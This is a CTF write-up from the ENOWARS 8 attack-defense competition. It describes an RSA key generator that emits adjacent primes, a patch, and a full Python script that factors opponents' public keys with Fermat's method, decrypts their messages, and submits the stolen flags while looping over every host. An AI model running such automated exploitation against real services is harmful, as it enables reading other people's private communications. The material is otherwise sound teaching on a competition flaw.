**ENOWARS 8**... wow... just wow...
My first normal experience in **Attack Defense** ctf where i patched one bug and exploited it with a huge python script to steal flags from other players.

## Description
Web site with authentication, where users have their own public and private keys to communicate. 
In main page after logging we can send encrypted messages in broadcast channel, any user can see this encrypted messages and destination email.
And we have endpoint `/user-list` where we can take any registered users email and his public key(to send encrypted message in broadcast).

Project structure:
```js
tree .                                      
.
├── docker-compose.override.yml
├── docker-compose.yml
├── Dockerfile
├── entrypoint.sh
├── gunicorn.conf.py
├── instance
│   └── database.db
├── main.py
├── requirements.txt
└── src
    ├── aes_encryption.py
    ├── auth.py
    ├── call_c.py
    ├── cleanup.py
    ├── __init__.py
    ├── key_gen
    ├── models.py
    ├── rsa_encryption.py
    ├── static
    │   ├── index.js
    │   ├── Logo.PNG
    │   └── style.css
    ├── templates
    │   ├── add_friend.html
    │   ├── backup.html
    │   ├── base.html
    │   ├── flag.html
    │   ├── group_page.html
    │   ├── group_page_unauthorized.html
    │   ├── groups.html
    │   ├── home.html
    │   ├── login.html
    │   ├── profil.html
    │   ├── sign_up.html
    │   └── userlist.html
    └── views.py
```

## Patching
One of the vulnerabilities was in weak `p` and `q` generation. In `call_c.py` is calling binary `key_gen`. `key_gen` outputs two primes and second prime in prime next to first. 

```bash
./key_gen 
87776573034123401698941744852344688290382159953464635062902891846534365564283
87776573034123401698941744852344688290382159953464635062902891846534365564289
```

So, from jeopardy ctfs we can see that this binary is vulnerable to `fermats factorization` and it is trivial to calculate `private key` from `public key`.

Firstly we need to immediately patch this weakness.

using grep we can find where weak function was called:

```python
from Crypto.Util.number import getPrime

def get_keys():
    # p,q = call_c.get_prime_from_c()
    p,q = getPrime(256), getPrime(256)
    private_key, public_key = generate_key_pair(p,q)
    return private_key.save_pkcs1().decode(), public_key.save_pkcs1().decode()
```

Now, our `p` and `q` are really random primes. And we are defended from `fermats factorization`.

## Exploitation
Next, step is to figure out how to exploit this vulnerability and how to write POC script to steal flags from players in entire network. 

from my past ctfs i found working script to parse `p` and `q` from `n`:

```python
def fermat(n):
    a = math.isqrt(n)
    b2 = a * a - n
    while b2 < 0 or not math.isqrt(b2) ** 2 == b2:
        a += 1
        b2 = a * a - n
    b = math.isqrt(b2)
    p = a - b
    q = a + b
    return p, q
```

Soooo, what we need is to write a huge script(in my case).

## POC script

```python
from time import sleep
import rsa
import sympy
import base64
from Crypto.Util.number import getPrime, inverse, long_to_bytes
from sage.all import next_prime
import gmpy2
import requests
from random import randint
from bs4 import BeautifulSoup
import base64
from converpub_to_n_e import extract_n_e_from_pem 
import math
import pwn
import timeout_decorator

GAME_SERVER_IP = "10.0.13.37"
GAME_SERVER_PORT = "1337"
IP_PORT = "10.1.73.1:9696"
USER_COOKIE = ""

def sign_up(email: str, password="123456789123456789"):
    url = f'http://{IP_PORT}/sign-up'
    data = {
        "email": email,
        "name": email.split("@")[0],
        "public_key": "on",
        "password1": password,
        "password2": password
    }

    res = requests.post(url, data, allow_redirects=False, timeout=3)

    global USER_COOKIE 
    USER_COOKIE = res.cookies.get_dict()

    # print(USER_COOKIE)
    
    return

def get_home():
    url = f'http://{IP_PORT}/'
    global USER_COOKIE

    res = requests.get(url, cookies=USER_COOKIE)

    print(res.text)

def get_messages():
    url = f'http://{IP_PORT}/'
    global USER_COOKIE

    res = requests.get(url, cookies=USER_COOKIE, timeout=3)
    soup = BeautifulSoup(res.text, 'lxml')

    # Find all <li> tags with the class "received-message"
    items = soup.find_all('li', class_='list-group-item received-message')
    
    extracted_data = []
    
    for item in items:
        # Extract text content
        text = item.get_text(separator='\n').strip()
        
        # Split the text into lines
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        
        # Debugging output
        # print("Lines:", lines)
        
        if len(lines) >= 2:
            email_line = lines[0]
            encrypted_message_line = lines[1]
            
            try:
                # Extract email address
                email = email_line.split('To: ')[1].strip()
                # Extract encrypted message (base64)
                encrypted_message = encrypted_message_line.strip()
                
                # Append to the list of dictionaries
                extracted_data.append({
                    "email": email,
                    "encrypted_message": encrypted_message
                })
            except IndexError as e:
                # print(f"Error extracting email from line: {email_line}. Exception: {e}")
                pass
        else:
            # print(f"Skipping line due to insufficient data: {lines}")
            pass

    return extracted_data


def get_userlist():
    url = f'http://{IP_PORT}/userlist'
    global USER_COOKIE

    res = requests.get(url, cookies=USER_COOKIE)
    # print(res.text)

    soup = BeautifulSoup(res.text, 'lxml')
    list_items = soup.find_all('li', class_='list-group-item')
    parsed_data = []

    for item in list_items:
        email = item.text.split('Email: ')[1].split('\n')[0].strip()
        public_key = item.text.split('PublicKey: ')[1].strip()
        parsed_data.append({
            'email': email,
            'public_key': public_key
        })

    return parsed_data


def merge_data(messages, public_keys):
    # Create a dictionary for public keys with email as the key
    public_key_dict = {entry["email"]: entry["public_key"] for entry in public_keys}
    
    # Create the merged list
    merged_list = []
    for message_entry in messages:
        email = message_entry["email"]
        encrypted_message = message_entry["encrypted_message"]
        
        # Find the public key for the email
        public_key = public_key_dict.get(email, None)
        
        # Append the merged data if the public key is found
        if public_key:
            merged_list.append({
                "email": email,
                "encrypted_message": encrypted_message,
                "public_key": public_key
            })
    
    return merged_list


def base64_to_int(base64_ciphertext):
    ciphertext_bytes = base64.b64decode(base64_ciphertext)
    
    ciphertext_int = int.from_bytes(ciphertext_bytes, byteorder='big')
    
    return ciphertext_int


def fermat(n):
    a = math.isqrt(n)
    b2 = a * a - n
    while b2 < 0 or not math.isqrt(b2) ** 2 == b2:
        a += 1
        b2 = a * a - n
    b = math.isqrt(b2)
    p = a - b
    q = a + b
    return p, q

def rsa_decrypt(p, q, e, c):
    n = p * q

    phi_n = (p - 1) * (q - 1)

    d = sympy.mod_inverse(e, phi_n)

    m = pow(c, d, n)
    return m

def attack_user(user):
    enc = user["encrypted_message"]
    pub = user["public_key"]

    enc = base64_to_int(enc);
    n, _ = extract_n_e_from_pem(pub);

    e = 65537
    p, q = fermat(n)
    m = rsa_decrypt(p, q, e, enc)
    m = long_to_bytes(m)
    return m
    
def attack_multiple_users():
    flags = []
    messages = get_messages()
    public_keys = get_userlist()
    messages_with_keys = merge_data(messages, public_keys)
    

    for i in range(len(messages_with_keys)):
        user = messages_with_keys[i]
        m = attack_user(user)
        if b"ENO" in m:
            flag = b"ENO" + m.split(b"ENO")[1]
            flags.append(flag)
            # print(b"ENO" + flag)

    return flags

@timeout_decorator.timeout(3, timeout_exception=TimeoutError)
def attack_host(HOST_IP):
    global IP_PORT
    global USER_COOKIE
    IP_PORT = HOST_IP + ":9696"
    USER_COOKIE = ""
    sign_up(str(randint(1000, 10000)) + "@emal.com")
    flags = attack_multiple_users()
    r = pwn.remote(GAME_SERVER_IP, GAME_SERVER_PORT)

    for flag in flags:
        r.sendline(flag)
        res = r.recvline()
        print(res)

    r.close()
    
def attack_all_hosts():
    ips = open('./ips.txt', 'r').read().split("\n")

    for ip in ips:
        if ip == "10.1.59.1": # ignore our host
            continue
        try:
            attack_host(ip)
        except TimeoutError:
            print(f"Timeout occurred while attacking {ip}")
        except Exception as e:
            print(f"An error occurred while attacking {ip}: {e}")


while True:
    attack_all_hosts()
    sleep(60*4)
```

## Results
Points from attacking:
![](Pasted%20image%2020240721025716.png)
